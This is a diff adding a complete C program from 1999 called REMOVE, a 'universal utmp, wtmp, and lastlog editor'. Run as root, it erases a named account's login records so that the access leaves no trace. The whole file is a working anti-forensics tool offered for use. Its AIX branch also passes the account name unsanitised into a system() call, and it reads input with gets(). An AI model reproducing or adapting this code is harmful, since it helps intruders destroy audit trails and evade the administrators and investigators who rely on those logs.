@@ -1,0 +1,190 @@
+/*
+REMOVE       -- February 26, 1999
+Simple Nomad -- Nomad Mobile Research Centre
+
+Universal utmp, wtmp, and lastlog editor. Actually
+removes, doesn't leave holes...
+
+Compile "cc -o remove remove.c -DGENERIC" and run
+as root. Use -DAIX instead of -DGENERIC for an AIX
+machine. Use -DSCO instead of -DGENERIC for a SCO
+machine.
+*/
+
+#include <stdio.h>
+#include <utmp.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <fcntl.h>
+#ifndef AIX
+#include <lastlog.h>
+#else
+#include <login.h>
+#endif
+#include <pwd.h>
+
+#ifdef AIX
+#define WTMP "/var/log/wtmp"
+#define UTMP "/etc/utmp"
+#define LASTLOG "/etc/security/lastlog" /* Not a binary file in AIX, so */
+/* handled a bit differently.   */
+char LogParam[7][30]=
+{
+  "time_last_login=","tty_last_login=","host_last_login=",
+  "unsuccessful_login_count=","time_last_unsuccessful_login=",
+  "tty_last_unsuccessful_login=","host_last_unsuccessful_login="
+};
+#endif
+#ifdef SCO
+#define WTMP "/etc/wtmp"   /* wtmp was here on the SCO box I accessed */
+#define UTMP "/var/run/utmp"
+#define LASTLOG "/var/log/lastlog"
+#endif
+#ifdef GENERIC  /* Should work with Linux, IRIX, Digital Unix, BSDs, etc */
+#define WTMP "/var/log/wtmp"
+#define UTMP "/var/run/utmp"
+#define LASTLOG "/var/log/lastlog"
+#endif
+
+void main(argc,argv)
+int  argc;
+char *argv[];
+{
+  int cleanWtmp(char *,int);
+  int cleanUtmp(char *,int);
+  int cleanLastlog(char *);
+  int getCount(char *,char *);
+  char line[10];
+  int killem, firstcnt, t;
+
+  if(argc!=2)
+  {
+    printf("Usage: %s acct\n",argv[0]);
+    exit(0);
+  }
+  firstcnt=getCount(WTMP,argv[1]); /* Get an initial count */
+  printf("\nREMOVE by Simple Nomad\nNomad Mobile Research Centre (c) 1999\n\n")
+;
+  printf("Found %d record(s) for user %s\n",firstcnt,argv[1]);
+  printf("Will attempt a lastlog cleanup by default.\n\n");
+  printf("#    - remove last # records from utmp/wtmp\n");
+  printf("a    - remove (a)ll records from utmp/wtmp\n");
+  printf("q    - (q)uit program\n\n");
+  printf("Enter selection -> ");
+  gets(line);
+  if(line[0]==0x51 || line[0]==0x71) exit(0);
+  if(line[0]==0x41 || line[0]==0x61) killem=firstcnt;
+  else killem=atoi(line);
+  if (killem>firstcnt)
+  {
+    printf("You cannot delete %d records if only %d exist.\n",killem,firstcnt);
+    exit(-1);
+  }
+  t=cleanWtmp(argv[1],killem); /* Now to clean up utmp and wtmp */
+  if (t==1) {
+    printf("Trouble cleaning up %s.\n",WTMP);
+    exit(-1);
+  } else printf("REMOVE cleaned up %d record(s) from %s\n",killem,WTMP);
+  t=cleanUtmp(argv[1],killem);
+  if (t==1) {
+    printf("Trouble cleaning up %s.\n",UTMP);
+    exit(-1);
+  } else printf("REMOVE cleaned up %d record(s) from %s\n",killem,UTMP);
+  t=cleanLastlog(argv[1]);    /* Make our attempt at lastlog */
+  if (t==1) {
+    printf("Trouble cleaning up %s.\n",LASTLOG); exit(-1);
+  }
+  printf("REMOVE cleaned up %s\n",LASTLOG);
+} /* end main */
+
+int getCount(fname,acct) /* Go check wtmp and find out how many records */
+char *fname, *acct;
+{
+  struct utmp utmp_ent;
+  int f,cnt=0;
+
+  if((f=open(fname,O_RDWR))>=0){
+    while(read(f,&utmp_ent,sizeof(utmp_ent)))if(!strncmp(utmp_ent.ut_name, acct
+,strlen(acct)))cnt++;
+  }
+  close(f);
+  return(cnt);
+} /* end getCount */
+
+int cleanWtmp(acct,killem)
+char *acct;
+int killem;
+{
+  struct utmp utmp_ent;
+  int fd,count=0;
+  if((fd=open(WTMP,O_RDWR))>=0){
+    while(read(fd,&utmp_ent,sizeof(utmp_ent)))if(!strncmp(utmp_ent.ut_name,acct
+,strlen(acct)))count++;
+    lseek(fd,0,SEEK_SET);
+    while(read(fd,&utmp_ent,sizeof(utmp_ent))&&killem){
+      if(!strncmp(utmp_ent.ut_name,acct,strlen(acct))){
+        count--;
+        if(count+1<=killem){
+          bzero((char *)&utmp_ent,sizeof(utmp_ent));
+          lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
+          write(fd,&utmp_ent,sizeof(utmp_ent));
+          killem--;
+        }
+      }
+    }
+    close(fd);
+  }
+  else return(1);
+} /* end cleanWtmp */
+
+int cleanUtmp(acct,killem)
+char *acct;
+int killem;
+{
+  struct utmp utmp_ent;
+  int fd;
+  if((fd=open(UTMP,O_RDWR))>=0){
+    lseek(fd,0,SEEK_SET);
+    while(read(fd,&utmp_ent,sizeof(utmp_ent))&&killem){
+      if(!strncmp(utmp_ent.ut_name,acct,strlen(acct))){
+        if(killem>0){
+          bzero((char *)&utmp_ent,sizeof(utmp_ent));
+          lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
+          write(fd,&utmp_ent,sizeof(utmp_ent));
+          killem--;
+        }
+      }
+    }
+    close(fd);
+  }
+  else return(1);
+} /* end cleanUtmp */
+
+int cleanLastlog(acct) /* The lastlog subroutine */
+char *acct;
+{
+#ifdef AIX /* Quite a kludge for AIX, but what the fuck it works */
+  int t,i;
+  char entry[200];
+  for (i=0;i<7;i++)
+  {
+    sprintf(entry,"chsec -f %s -s %s -a %s>/dev/null",LASTLOG,acct,LogParam[i])
+;
+    t=system(entry);
+    printf("Return code for %s is %d\n",LogParam[i],t);
+  }
+#else  /* Normal binary lastlog cleanup */
+  struct passwd *pwd;
+  struct lastlog logit;
+  int f;
+  if((pwd=getpwnam(acct))){
+    if((f=open(LASTLOG,O_RDWR))>=0){
+      lseek(f,(long)pwd->pw_uid*sizeof(struct lastlog),0);
+      bzero((char *)&logit,sizeof(logit));
+      write(f,(char *)&logit,sizeof(logit));
+      close(f);
+    }
+  }
+  else return(1);
+#endif
+} /* end cleanLastlog */
